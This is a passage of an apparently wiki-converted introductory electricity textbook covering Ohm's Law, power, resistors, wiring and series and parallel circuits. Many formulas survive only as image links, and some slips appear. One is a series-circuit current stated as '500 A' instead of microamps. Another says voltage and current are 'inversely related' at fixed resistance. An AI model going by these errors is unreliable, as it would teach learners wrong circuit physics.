[[Image:Fhsst_electricity31.png|Fhsst_electricity31.png]]

In this second example, we will calculate the amount of resistance (''R'') in a circuit, given values of voltage (''E'') and current (''I''): 

[[Image:Fhsst_electricity32.png|Fhsst_electricity32.png]]

What is the amount of resistance (''R'') offered by the lamp?

[[Image:Fhsst_electricity33.png|Fhsst_electricity33.png]]

In the last example, we will calculate the amount of voltage supplied by a battery, given values of current (''I'') and resistance (''R''): 

[[Image:Fhsst_electricity34.png|Fhsst_electricity34.png]]

What is the amount of voltage provided by the battery?

[[Image:Fhsst_electricity35.png|Fhsst_electricity35.png]]

Ohm's Law is a very simple and useful tool for analyzing electric circuits. It is used so often in the study of electricity and
electronics that it needs to be committed to memory by the serious student. For those who are not yet comfortable with algebra, there's
a trick to remembering how to solve for any one quantity, given the other two. First, arrange the letters ''E'', ''I'', and ''R'' in a triangle like
this: 

[[Image:Fhsst_electricity36.png|Fhsst_electricity36.png]]

If you know ''E'' and ''I'', and wish to determine ''R'', just eliminate ''R'' from the picture and see what's left: 

[[Image:Fhsst_electricity37.png|Fhsst_electricity37.png]]

If you know E and R, and wish to determine I, eliminate I and see what's left:

[[Image:Fhsst_electricity38.png|Fhsst_electricity38.png]]

Lastly, if you know ''I'' and ''R'', and wish to determine ''E'', eliminate ''E'' and see what's left: 

[[Image:Fhsst_electricity39.png|Fhsst_electricity39.png]]

Eventually, you'll have to be familiar with algebra to seriously study electricity and electronics, but this tip can make your first
calculations a little easier to remember. If you are comfortable with algebra, all you need to do is commit ''E'' = ''IR'' to memory and derive the
other two formulae from that when you need them!</text>

= An analogy for Ohm's Law =

Ohm's Law also make intuitive sense if you apply it to the water-and-pipe analogy. If we have a water pump that exerts pressure
(voltage) to push water around a &quot;circuit&quot; (current) through a restriction (resistance), we can model how the three variables
interrelate. If the resistance to water flow stays the same and the pump pressure increases, the flow rate must also increase. 

If the pressure stays the same and the resistance increases (making it more difficult for the water to flow), then the flow rate must
decrease.

If the flow rate were to stay the same while the resistance to flow decreased, the required pressure from the pump would necessarily
decrease.

As odd as it may seem, the actual mathematical relationship between pressure, flow, and resistance is actually more complex for fluids
like water than it is for electrons. If you pursue further studies in physics, you will discover this for yourself. Thankfully for the
electronics student, the mathematics of Ohm's Law is very straightforward and simple.

= Power in electric circuits =

In addition to voltage and current, there is another measure of free electron activity in a circuit: ''power''. First, we need to
understand just what power is before we analyze it in any circuits. 

Power is a measure of how much work can be performed in a given amount of time. ''Work'' is generally defined in terms of the lifting
of a weight against the pull of gravity. The heavier the weight and/or the higher it is lifted, the more work has been done.
''Power'' is a measure of how rapidly a standard amount of work is done. 

In electric circuits, power is a function of both voltage and current. 

&lt;math&gt;P=I E&lt;/math&gt;

In this case, however, power (P) is exactly equal to current (I) multiplied by voltage (E), rather than merely being proportional to
IE. When using this formula, the unit of measurement for power is the ''watt'', abbreviated with the letter &quot;W.&quot; 

It must be understood that neither voltage nor current by themselves constitute power. Rather, power is the combination of both voltage
''and'' current in a circuit. Remember that voltage is the specific work (or potential energy) per unit charge, while current is
the rate at which electric charges move through a conductor. Voltage (specific work) is analogous to the work done in lifting a weight
against the pull of gravity. Current (rate) is analogous to the speed at which that weight is lifted. Together as a product
(multiplication), voltage (work) and current (rate) constitute power. 

A circuit with high voltage and low current may be dissipating the same amount of power as a circuit with low voltage and high
current. Neither the amount of voltage alone nor the amount of current alone indicates the amount of power in an electric circuit. 

In an open circuit, where voltage is present between the terminals of the source and there is zero current, there is ''zero'' power
dissipated, no matter how great that voltage may be. Since &lt;math&gt;P=I E&lt;/math&gt; and &lt;math&gt;I=0&lt;/math&gt; and anything multiplied by zero is zero, the power dissipated in any open circuit must be zero.

== Heat as a by-product ==
Usually heat is produced as a &quot;side-effect&quot; of using an electrical appliance such as a TV set or a computer. Heat is one of the forms of power and there must be a way to get rid of that heat or else the temperature may keep increasing, possibly leading to a breakdown of the apparatus concerned, or even, in an extreme case, to a fire. Make sure there is always enough circulation of air, for examples, in a TV set or a computer; never block the special openings provided in the case of the TV set, or of the computer, etc.; these openings are there on purpose to get rid of the heat.

Often the &quot;rating&quot; of an electrical or electronic item depends on its maximum permitted temperature. A resistor is rated at one watt, for example. Then it will get hot, but not too hot, if its voltage times its current equal no more than one Watt; but that is only true if enough air can get to it to cool it down. Some people will, for example, never &quot;load&quot; a resistor that is rated at a given amount of Watts with more than half that rated power.

The name plate at the rear of the TV set or computer, for example, usually indicates the total amount of Watts that is used, including the part that is converted into heat.</text>

= Calculating electric power =

We've seen the formula for determining the power in an electric circuit: by multiplying the voltage in &quot;volts&quot; by the current in
&quot;amps&quot; we arrive at an answer in &quot;watts.&quot; Let's apply this to a circuit example: 

[[Image:Fhsst_electricity43.png|Fhsst_electricity43.png]]

In the above circuit, we know we have a battery voltage of 18 volts and a lamp resistance of 3 &lt;math&gt;\Omega&lt;/math&gt;. Using Ohm's Law to determine
current, we get: 

&lt;center&gt;&lt;math&gt;I = \frac{E}{R} = \frac {18V}{3\Omega} = 6 A&lt;/math&gt;&lt;/center&gt;

Now that we know the current, we can take that value and multiply it by the voltage to determine power: 

&lt;center&gt;&lt;math&gt;P = I \ E = (6A) (18V) = 108W &lt;/math&gt;&lt;/center&gt;

Answer: the lamp is dissipating (releasing) 108 watts of power, most likely in the form of both light and heat. 

Let's try taking that same circuit and increasing the battery voltage to see what happens. Intuition should tell us that the circuit
current will increase as the voltage increases and the lamp resistance stays the same. Likewise, the power will increase as well: 

[[Image:Fhsst_electricity44.png|Fhsst_electricity44.png]]

Now, the battery voltage is 36 volts instead of 18 volts. The lamp is still providing 3 &lt;math&gt;\Omega&lt;/math&gt; of electrical resistance to the flow of
electrons. The current is now: 

&lt;center&gt;&lt;math&gt;I = \frac{E}{R} = \frac {36V}{3\Omega} = 12 A&lt;/math&gt;&lt;/center&gt;

This stands to reason: if &lt;math&gt;I = \frac{E}{R}&lt;/math&gt;, and we double E while R stays the same, the current should double. Indeed, it has: we now have 12 amps
of current instead of 6. Now, what about power? 

&lt;center&gt;&lt;math&gt;P = I \ E = (12A) (36V) = 432W &lt;/math&gt;&lt;/center&gt;

Notice that the power has increased just as we might have suspected, but it increased quite a bit more than the current. Why is this?
Because power is a function of voltage multiplied by current, and ''both'' voltage and current doubled from their previous values,
the power will increase by a factor of 2 x 2, or 4. You can check this by dividing 432 watts by 108 watts and seeing that the ratio
between them is indeed 4. 

Using algebra again to manipulate the formulae, we can take our original power formula and modify it for applications where we don't
know both voltage and resistance: 

If we only know voltage (E) and resistance (R):


{| 
|''If''
|class=&quot;eqno&quot; align=&quot;LEFT&quot; |&lt;math&gt;I=\frac{E}{R}&lt;/math&gt; 
|class=&quot;eqno&quot; align=&quot;CENTER&quot; | and
|class=&quot;eqno&quot; align=&quot;RIGHT&quot; |&lt;math&gt;P=IE&lt;/math&gt;
|-
|class=&quot;eqno&quot; align=&quot;LEFT&quot; |then &lt;math&gt;P=\frac{E}{R}E&lt;/math&gt; 
|class=&quot;eqno&quot; align=&quot;CENTER&quot; | or
|class=&quot;eqno&quot; align=&quot;RIGHT&quot; |&lt;math&gt;P=\frac{E^2}{R}&lt;/math&gt;
|}

If we only know current (I) and resistance (R):

|''An historical note:'' It was James Prescott Joule, not Georg Simon Ohm, who first discovered the mathematical relationship between power dissipation and current through a resistance. This discovery, published in 1841, followed the form of the last equation (&lt;math&gt;P =I^{2}R&lt;/math&gt;), 
and is properly known as Joule's Law. However, these power equations are so commonly associated with the  Ohm's Law equations relating voltage, current, and resistance (&lt;math&gt;E=IR&lt;/math&gt;, &lt;math&gt;I=\frac{E}{R}&lt;/math&gt; and &lt;math&gt;R=\frac{E}{I}&lt;/math&gt;) that they are frequently credited to Ohm.

= Resistors =

Because the relationship between voltage, current, and resistance in any circuit is so regular, we can reliably control any variable in a
circuit simply by controlling the other two. Perhaps the easiest variable in any circuit to control is its resistance. This can be
done by changing the material, size, and shape of its conductive components (remember how the thin metal filament of a lamp created
more electrical resistance than a thick wire?). 

Special components called ''resistors'' are made for the express purpose of creating a precise quantity of resistance for insertion
into a circuit. They are typically constructed of metal wire or carbon, and engineered to maintain a stable resistance value over a
wide range of environmental conditions. Unlike lamps, they do not produce light, but they do produce heat as electric power is
dissipated by them in a working circuit. Typically, though, the purpose of a resistor is not to produce usable heat, but simply to
provide a precise quantity of electrical resistance.  

The most common schematic symbol for a resistor is a zigzag line:


Resistor values in ohms are usually shown as an adjacent number, and if several resistors are present in a circuit, they will be labeled
with a unique identifier number such as &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, &lt;math&gt;R_3&lt;/math&gt;, etc. As you can see, resistor symbols can be shown either
horizontally or vertically: 


In keeping more with their physical appearance, an alternative schematic symbol for a resistor looks like a small, rectangular box: 


Resistors can also be shown to have varying rather than fixed resistances. This might be for the purpose of describing an actual
physical device designed for the purpose of providing an adjustable resistance, or it could be to show some component that just happens to
have an unstable resistance: 

In fact, any time you see a component symbol drawn with a diagonal arrow through it, that component has a variable rather than a fixed
value. This symbol &quot;modifier&quot; (the diagonal arrow) is standard electronic symbol convention. 

Because resistors dissipate heat energy as the electric currents through them overcome the &quot;friction&quot; of their resistance, resistors
are also rated in terms of how much heat energy they can dissipate without overheating and sustaining damage. Naturally, this power
rating is specified in the physical unit of &quot;watts.&quot; Most resistors found in small electronic devices such as portable radios are rated at
1/4 (0.25) watt or less. The power rating of any resistor is roughly proportional to its physical size. Also note how
resistances (in ohms) have nothing to do with size!</text>

''&quot;Advances are made by answering questions. Discoveries are made by questioning answers.&quot;''

''Bernhard Haisch, Astrophysicist''
&lt;/blockquote&gt;

Ohm's Law is a simple and powerful mathematical tool for helping us analyze electric circuits, but it has limitations, and we must
understand these limitations in order to properly apply it to real circuits. For most conductors, resistance is a rather stable
property, largely unaffected by voltage or current. For this reason, we can regard the resistance of most circuit components as a constant,
with voltage and current being inversely related to each other. 

For instance, our previous circuit example with the 3 &lt;math&gt;\Omega&lt;/math&gt; lamp, we calculated current through the circuit by dividing voltage by resistance (''I'' = ''E''/''R''). With an 18 volt battery, our circuit current was 6 amperes. Doubling the battery voltage to 36 volts resulted in a
doubled current of 12 amperes. All of this makes sense, of course, so long as the lamp continues to provide exactly the same amount of friction (resistance) to the flow of electrons through it: 3 &amp;Omega;.

[[Image:Fhsst_electricity50.png|Fhsst_electricity50.png]]

However, reality is not always this simple. One of the phenomena we need to mention is of conductor resistance
''changing'' with temperature. In an incandescent lamp (the kind employing the principle of electric current heating a thin filament of wire to the point that it glows white-hot), the resistance of the filament wire will increase dramatically as it warms from room temperature to operating temperature. If we were to increase the supply voltage in a real lamp circuit, the resulting increase in current would cause the filament to increase temperature, which would in turn increase its resistance, thus preventing further increases in current without further increases in battery voltage. Consequently, voltage and current do not follow the simple equation &lt;math&gt;I=\frac{E}{R}&lt;/math&gt; (with ''R''
assumed to be equal to 3 &lt;math&gt;\Omega&lt;/math&gt;) because an incandescent lamp's filament resistance does not remain stable for different currents. 

The phenomenon of resistance changing with variations in temperature is one shared by almost all metals, of which most wires are made. For
most applications, these changes in resistance are small enough to be ignored. In the application of metal lamp filaments, the change
happens to be quite large. 

A more realistic analysis of a lamp circuit, however, over several different values of battery voltage would generate a plot of this
shape: 

[[Image:Fhsst_electricity51.png|Fhsst_electricity51.png]]

The plot is no longer a straight line. It rises sharply on the left, as voltage increases from zero to a low level. As it progresses to
the right we see the line flattening out, the circuit requiring greater and greater increases in voltage to achieve equal increases in
current. 

If we try to apply Ohm's Law to find the resistance of this lamp circuit with the voltage and current values plotted above, we arrive
at several different values. We could say that the resistance here is ''nonlinear'', increasing with increasing current and voltage.
The nonlinearity is caused by the effects of high temperature on the metal wire of the lamp filament.</text>

= Circuit wiring =

So far, we've been analyzing single-battery, single-resistor circuits with no regard for the connecting wires between the components, so
long as a complete circuit is formed. Does the wire length or circuit &quot;shape&quot; matter to our calculations? Let's look at a couple of circuit
configurations and find out: 

When we draw wires connecting points in a circuit, we usually assume those wires have negligible resistance. As such, they contribute no
appreciable effect to the overall resistance of the circuit, and so the only resistance we have to contend with is the resistance in the
components. In the above circuits, the only resistance comes from the 5 &lt;math&gt;\Omega&lt;/math&gt; resistors, so that is all we will consider in our
calculations. In real life, metal wires actually ''do'' have resistance (and so do power sources!), but those resistances are
generally so much smaller than the resistance present in the other circuit components that they can be safely ignored. 

If connecting wire resistance is very little or none, we can regard the connected points in a circuit as being ''electrically
common''. That is, points 1 and 2 in the above circuits may be physically joined close together or far apart, and it doesn't matter
for any voltage or resistance measurements relative to those points. The same goes for points 3 and 4. It is as if the ends of the
resistor were attached directly across the terminals of the battery, so far as our Ohm's Law calculations and voltage measurements are
concerned. This is useful to know, because it means you can re-draw a circuit diagram or re-wire a circuit, shortening or lengthening the
wires as desired without appreciably impacting the circuit's function. All that matters is that the components attach to each other in the
same sequence. 

It also means that voltage measurements between sets of &quot;electrically common&quot; points will be the same. That is, the voltage between points
1 and 4 (directly across the battery) will be the same as the voltage between points 2 and 3 (directly across the resistor). Take a close
look at the following circuit, and try to determine which points are common to each other: 


Here, we only have 2 components excluding the wires: the battery and the resistor. Though the connecting wires take a convoluted path in
forming a complete circuit, there are several electrically common points in the electrons' path. Points 1, 2, and 3 are all common to
each other, because they're directly connected together by wire. The same goes for points 4, 5, and 6. 

The voltage between points 1 and 6 is 10 volts, coming straight from the battery. However, since points 5 and 4 are common to 6, and
points 2 and 3 common to 1, that same 10 volts also exists between these other pairs of points: 




&lt;tt&gt;Between points 1 and 4 = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 2 and 4 = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 3 and 4 = 10 volts (directly across the resistor) &lt;/tt&gt;

&lt;tt&gt;Between points 1 and 5 = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 2 and 5 = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 3 and 5 = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 1 and 6 = 10 volts (directly across the battery) &lt;/tt&gt;

&lt;tt&gt;Between points 2 and 6 = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 3 and 6 = 10 volts &lt;/tt&gt;



Since electrically common points are connected together by (zero resistance) wire, there is no significant voltage drop between them
regardless of the amount of current conducted from one to the next through that connecting wire. Thus, if we were to read voltages
between common points, we should show (practically) zero:  



&lt;tt&gt;Between points 1 and 2 = 0 volts         Points 1, 2, and 3 are &lt;/tt&gt;

&lt;tt&gt;Between points 2 and 3 = 0 volts         electrically common &lt;/tt&gt;

&lt;tt&gt;Between points 1 and 3 = 0 volts &lt;/tt&gt;


&lt;tt&gt;Between points 4 and 5 = 0 volts         Points 4, 5, and 6 are &lt;/tt&gt;

&lt;tt&gt;Between points 5 and 6 = 0 volts         electrically common &lt;/tt&gt;

&lt;tt&gt;Between points 4 and 6 = 0 volts &lt;/tt&gt;


This makes sense mathematically, too. With a 10 volt battery and a 5 &lt;math&gt;\Omega&lt;/math&gt; resistor, the circuit current will be 2 amperes. With wire
resistance being zero, the voltage drop across any continuous stretch of wire can be determined through Ohm's Law as such: 

It should be obvious that the calculated voltage drop across any uninterrupted length of wire in a circuit where wire is assumed to
have zero resistance will always be zero, no matter what the magnitude of current, since zero multiplied by anything equals zero. 

Because common points in a circuit will exhibit the same relative voltage and resistance measurements, wires connecting common points
are often labeled with the same designation. This is not to say that the ''terminal'' connection points are labeled the same, just the
connecting wires. Take this circuit as an example: 

Points 1, 2, and 3 are all common to each other, so the wire connecting point 1 to 2 is labeled the same (wire 2) as the wire
connecting point 2 to 3 (wire 2). In a real circuit, the wire stretching from point 1 to 2 may not even be the same color or size as
the wire connecting point 2 to 3, but they should bear the exact same label. The same goes for the wires connecting points 6, 5, and 4. 

Knowing that electrically common points have zero voltage drop between them is a valuable troubleshooting principle. If I measure for
voltage between points in a circuit that are supposed to be common to each other, I should read zero. If, however, I read substantial
voltage between those two points, then I know with certainty that they cannot be directly connected together. If those points are
''supposed'' to be electrically common but they register otherwise, then I know that there is an &quot;open failure&quot; between those points. 

One final note: for most practical purposes, wire conductors can be assumed to possess zero resistance from end to end. In reality,
however, there will always be some small amount of resistance encountered along the length of a wire, unless it's a superconducting
wire. Knowing this, we need to bear in mind that the principles learned here about electrically common points are all valid to a large
degree, but not to an ''absolute'' degree. That is, the rule that electrically common points are guaranteed to have zero voltage
between them is more accurately stated as such: electrically common points will have ''very little'' voltage dropped between them.
That small, virtually unavoidable trace of resistance found in any piece of connecting wire is bound to create a small voltage across the
length of it as current is conducted through. So long as you understand that these rules are based upon ''ideal'' conditions,
you won't be perplexed when you come across some condition appearing to be an exception to the rule.</text>

= Polarity of voltage drops =

We can trace the direction that electrons will flow in the same circuit by starting at the negative (-) terminal and following through
to the positive (+) terminal of the battery, the only source of voltage in the circuit. From this we can see that the electrons are
moving counter-clockwise, from point 6 to 5 to 4 to 3 to 2 to 1 and back to 6 again. 

As the current encounters the 5 &lt;math&gt;\Omega&lt;/math&gt; resistance, voltage is dropped across the resistor's ends. The signs of this voltage drop
is negative (-) at point 4 with respect to positive (+) at point 3. We can mark the polarity of the resistor's voltage drop with these
negative and positive symbols, in accordance with the direction of current (whichever end of the resistor the current is
''entering'' is negative with respect to the end of the resistor it is ''exiting'': 

[[Image:Fhsst_electricity56.png|Fhsst_electricity00052.png]]

We could make our table of voltages a little more complete by marking the polarity of the voltage for each pair of points in this circuit: 


&lt;tt&gt;Between points 1 (+) and 4 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 2 (+) and 4 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 3 (+) and 4 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 1 (+) and 5 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 2 (+) and 5 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 3 (+) and 5 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 1 (+) and 6 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 2 (+) and 6 (-) = 10 volts &lt;/tt&gt;

&lt;tt&gt;Between points 3 (+) and 6 (-) = 10 volts &lt;/tt&gt;


While it might seem a little silly to document polarity of voltage drop in this circuit, it is an important concept to master. It will
be critically important in the analysis of more complex circuits involving multiple resistors and/or batteries. 

It should be understood that polarity has nothing to do with Ohm's Law: there will never be negative voltages, currents, or resistance
entered into any Ohm's Law equations! There are other mathematical principles of electricity that do take polarity into account through
the use of signs (+ or -), but not Ohm's Law.</text>

= What are &quot;series&quot; and &quot;parallel&quot; circuits? =

Circuits consisting of just one battery and one load resistance are very simple to analyze, but they are not often found in practical
applications. Usually, we find circuits where more than two components are connected together. 

There are two basic ways in which to connect more than two circuit components: ''series'' and ''parallel''. First, an example
of a series circuit: 

[[Image:Fhsst_electricity57.png|Fhsst_electricity57.png]]

Here, we have three resistors (labeled &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and &lt;math&gt;R_3&lt;/math&gt;), connected in a long chain from one terminal of the battery to the
other. (It should be noted that the subscript labeling - those little numbers to the lower-right of the letter &quot;R&quot; - are unrelated
to the resistor values in ohms. They serve only to identify one resistor from another.) The defining characteristic of a series
circuit is that there is only one path for electrons to flow. In this circuit the electrons flow in a counter-clockwise direction, from
point 4 to point 3 to point 2 to point 1 and back around to 4. 

Now, let's look at the other type of circuit, a parallel configuration:

[[Image:Fhsst_electricity58.png|Fhsst_electricity58.png]]

Again, we have three resistors, but this time they form more than one continuous path for electrons to flow. There's one path from 8 to 7
to 2 to 1 and back to 8 again. There's another from 8 to 7 to 6 to 3 to 2 to 1 and back to 8 again. And then there's a third path from 8
to 7 to 6 to 5 to 4 to 3 to 2 to 1 and back to 8 again. Each individual path (through &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and &lt;math&gt;R_3&lt;/math&gt;) is called a
''branch''. 

The defining characteristic of a parallel circuit is that all components are connected between the same set of electrically common
points. Looking at the schematic diagram, we see that points 1, 2, 3, and 4 are all electrically common. So are points 8, 7, 6, and 5.
Note that all resistors as well as the battery are connected between these two sets of points. 

And, of course, the complexity doesn't stop at simple series and parallel either! We can have circuits that are a combination of
series and parallel, too: 

[[Image:Fhsst_electricity59.png|Fhsst_electricity59.png]]

In this circuit, we have two loops for electrons to flow through: one from 6 to 5 to 2 to 1 and back to 6 again, and another from 6 to 5 to
4 to 3 to 2 to 1 and back to 6 again. Notice how both current paths go through &lt;math&gt;R_1&lt;/math&gt; (from point 2 to point 1). In this configuration,
we'd say that &lt;math&gt;R_2&lt;/math&gt; and &lt;math&gt;R_3&lt;/math&gt; are in parallel with each other, while &lt;math&gt;R_1&lt;/math&gt; is in series with the parallel combination of &lt;math&gt;R_2&lt;/math&gt;
and &lt;math&gt;R_3&lt;/math&gt;. 

This is just a preview of things to come. Don't worry! We'll explore all these circuit configurations in detail, one at a time! 

The basic idea of a &quot;series&quot; connection is that components are connected end-to-end in a line to form a single path for electrons to
flow: 

[[Image:Fhsst_electricity60.png|Fhsst_electricity60.png]]

The basic idea of a &quot;parallel&quot; connection, on the other hand, is that all components are connected across each other's leads. In a purely
parallel circuit, there are never more than two sets of electrically common points, no matter how many components are connected. There are
many paths for electrons to flow, but only one voltage across all components: 

[[Image:Fhsst_electricity61.png|Fhsst_electricity61.png]]

Series and parallel resistor configurations have very different electrical properties. We'll explore the properties of each
configuration in the sections to come.</text>

= Simple series circuits =

Let's start with a series circuit consisting of three resistors and a single battery: 

[[Image:Fhsst_electricity62.png|Fhsst_electricity62.png]]

The first principle to understand about series circuits is that the amount of current is the same through any component in the circuit.
This is because there is only one path for electrons to flow in a series circuit, and because free electrons flow through conductors
like marbles in a tube, the rate of flow (marble speed) at any point in the circuit (tube) at any specific point in time must be equal. 

From the way that the 9 volt battery is arranged, we can tell that the electrons in this circuit will flow in a counter-clockwise direction,
from point 4 to 3 to 2 to 1 and back to 4. However, we have one source of voltage and three resistances. How do we use Ohm's Law here? 

An important caveat to Ohm's Law is that all quantities (voltage, current, resistance, and power) must relate to each other in terms of
the same two points in a circuit. For instance, with a single-battery, single-resistor circuit, we could easily calculate any
quantity because they all applied to the same two points in the circuit: 

[[Image:Fhsst_electricity63.png|Fhsst_electricity63.png]]

[[Image:Fhsst_electricity64.png|Fhsst_electricity64.png]]

Since points 1 and 2 are connected together with wire of negligible resistance, as are points 3 and 4, we can say that point 1 is
electrically common to point 2, and that point 3 is electrically common to point 4. Since we know we have 9 volts of electromotive
force between points 1 and 4 (directly across the battery), and since point 2 is common to point 1 and point 3 common to point 4, we must
also have 9 volts between points 2 and 3 (directly across the resistor). Therefore, we can apply Ohm's Law (&lt;math&gt;I =\frac{E}{R}&lt;/math&gt;) to the current
through the resistor, because we know the voltage (E) across the resistor and the resistance (R) of that resistor. All terms (E, I, R)
apply to the same two points in the circuit, to that same resistor, so we can use the Ohm's Law formula with no reservation. 

However, in circuits containing more than one resistor, we must be careful in how we apply Ohm's Law. In the three-resistor example
circuit below, we know that we have 9 volts between points 1 and 4, which is the amount of electromotive force trying to push electrons
through the series combination of &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and &lt;math&gt;R_3&lt;/math&gt;. However, we cannot take the value of 9 volts and divide it by 3k, 10k
or 5k &lt;math&gt;\Omega&lt;/math&gt; to try to find a current value, because we don't know how much voltage is across any one of those resistors, individually.

The figure of 9 volts is a ''total'' quantity for the whole circuit, whereas the figures of 3k, 10k, and 5k &lt;math&gt;\Omega&lt;/math&gt; are
''individual'' quantities for individual resistors. If we were to plug a figure for total voltage into an Ohm's Law equation with a
figure for individual resistance, the result would not relate accurately to any quantity in the real circuit. 

For &lt;math&gt;R_1&lt;/math&gt;, Ohm's Law will relate the amount of voltage across &lt;math&gt;R_1&lt;/math&gt; with the current through &lt;math&gt;R_1&lt;/math&gt;, given &lt;math&gt;R_1&lt;/math&gt;'s resistance,
3k&lt;math&gt;\Omega&lt;/math&gt;: 

[[Image:Fhsst_electricity66.png|Fhsst_electricity66.png]]

But, since we don't know the voltage across &lt;math&gt;R_1&lt;/math&gt; (only the total voltage supplied by the battery across the three-resistor series
combination) and we don't know the current through &lt;math&gt;R_1&lt;/math&gt;, we can't do any calculations with either formula. The same goes for &lt;math&gt;R_2&lt;/math&gt;
and &lt;math&gt;R_3&lt;/math&gt;: we can apply the Ohm's Law equations if and only if all terms are representative of their respective quantities between the
same two points in the circuit. 

So what can we do? We know the voltage of the source (9 volts) applied across the series combination of &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and
&lt;math&gt;R_3&lt;/math&gt;, and we know the resistances of each resistor, but since those quantities aren't in the same context, we can't use Ohm's Law to
determine the circuit current. If only we knew what the ''total'' resistance was for the circuit: then we could calculate ''total'' current with our figure for ''total'' voltage
(&lt;math&gt;I =\frac{E}{R}&lt;/math&gt;). 

This brings us to the second principle of series circuits: the total resistance of any series circuit is equal to the sum of the individual
resistances. This should make intuitive sense: the more resistors in series that the electrons must flow through, the more difficult it
will be for those electrons to flow. In the example problem, we had a 3 k&lt;math&gt;\Omega&lt;/math&gt;, 10 k&lt;math&gt;\Omega&lt;/math&gt;, and 5 k&lt;math&gt;\Omega&lt;/math&gt; resistor in series, giving
us a total resistance of 18 k&lt;math&gt;\Omega&lt;/math&gt;: 

[[Image:Fhsst_electricity67.png|Fhsst_electricity67.png]]

In essence, we've calculated the equivalent resistance of &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and &lt;math&gt;R_3&lt;/math&gt; combined. Knowing this, we could re-draw the
circuit with a single equivalent resistor representing the series combination of &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and &lt;math&gt;R_3&lt;/math&gt;: 

[[Image:Fhsst_electricity68.png|Fhsst_electricity68.png]]

Now we have all the necessary information to calculate circuit current, because we have the voltage between points 1 and 4 (9 volts)
and the resistance between points 1 and 4 (18 k&lt;math&gt;\Omega&lt;/math&gt;): 

[[Image:Fhsst_electricity69.png|Fhsst_electricity69.png]]

Knowing that current is equal through all components of a series circuit (and we just determined the current through the battery), we
can go back to our original circuit schematic and note the current through each component: 

[[Image:Fhsst_electricity70.png|Fhsst_electricity70.png]]

Now that we know the amount of current through each resistor, we can use Ohm's Law to determine the voltage drop across each one (applying
Ohm's Law in its proper context): 

[[Image:Fhsst_electricity71.png|Fhsst_electricity71.png]]

Notice the voltage drops across each resistor, and how the sum of the voltage drops (1.5 + 5 + 2.5) is equal to the battery (supply)
voltage: 9 volts. This is the third principle of series circuits: that the supply voltage is equal to the sum of the individual voltage
drops. 

However, the method we just used to analyze this simple series circuit can be streamlined for better understanding. By using a table to list
all voltages, currents, and resistances in the circuit, it becomes very easy to see which of those quantities can be properly related in
any Ohm's Law equation: 

[[Image:Fhsst_electricity72.png|Fhsst_electricity72.png]]

The rule with such a table is to apply Ohm's Law only to the values within each vertical column. For instance, &lt;math&gt;E_R1&lt;/math&gt; only with
&lt;math&gt;I_R1&lt;/math&gt; and &lt;math&gt;R_1&lt;/math&gt;  &lt;math&gt;E_R2&lt;/math&gt; only with &lt;math&gt;I_R2&lt;/math&gt; and &lt;math&gt;R_2&lt;/math&gt;  etc.
You begin your analysis by filling in those elements of the table that are given to you from the beginning: 

[[Image:Fhsst_electricity73.png|Fhsst_electricity73.png]]

As you can see from the arrangement of the data, we can't apply the 9 volts of &lt;math&gt;E_T&lt;/math&gt; (total voltage) to any of the resistances (&lt;math&gt;R_1&lt;/math&gt;,
&lt;math&gt;R_2&lt;/math&gt;, or &lt;math&gt;R_3&lt;/math&gt;) in any Ohm's Law formula because they're in different columns. The 9 volts of battery voltage is ''not''
applied directly across &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, or &lt;math&gt;R_3&lt;/math&gt;. However, we can use our &quot;rules&quot; of series circuits to fill in blank spots on a
horizontal row. In this case, we can use the series rule of resistances to determine a total resistance from the ''sum'' of
individual resistances: 

[[Image:Fhsst_electricity74.png|Fhsst_electricity74.png]]

Now, with a value for total resistance inserted into the rightmost (&quot;Total&quot;) column, we can apply Ohm's Law of &lt;math&gt;I=\frac{E}{R}&lt;/math&gt; to total voltage and total resistance to arrive at a total current of 500 ''A'': 

[[Image:Fhsst_electricity75.png|Fhsst_electricity75.png]]

Then, knowing that the current is shared equally by all components of a series circuit (another &quot;rule&quot; of series circuits), we can fill in
the currents for each resistor from the current figure just calculated: 

[[Image:Fhsst_electricity76.png|Fhsst_electricity76.png]]

Finally, we can use Ohm's Law to determine the voltage drop across each resistor, one column at a time:

= Simple parallel circuits =

Let's start with a parallel circuit consisting of three resistors and a single battery: 

[[Image:Fhsst_electricity78.png|Fhsst_electricity78.png]]

The first principle to understand about parallel circuits is that the voltage is equal across all components in the circuit. This is
because there are only two sets of electrically common points in a parallel circuit, and voltage measured between sets of common points
must always be the same at any given time. Therefore, in the above circuit, the voltage across &lt;math&gt;R_1&lt;/math&gt; is equal to the voltage across
&lt;math&gt;R_2&lt;/math&gt; which is equal to the voltage across &lt;math&gt;R_3&lt;/math&gt; which is equal to the voltage across the battery. This equality of voltages can be
represented in another table for our starting values: 


[[Image:Fhsst_electricity79.png|Fhsst_electricity79.png]]

Just as in the case of series circuits, the same caveat for Ohm's Law applies: values for voltage, current, and resistance must be in the
same context in order for the calculations to work correctly. However, in the above example circuit, we can immediately apply Ohm's
Law to each resistor to find its current because we know the voltage across each resistor (9 volts) and the resistance of each resistor: 

[[Image:Fhsst_electricity80.png|Fhsst_electricity80.png]]

[[Image:Fhsst_electricity81.png|Fhsst_electricity81.png]]

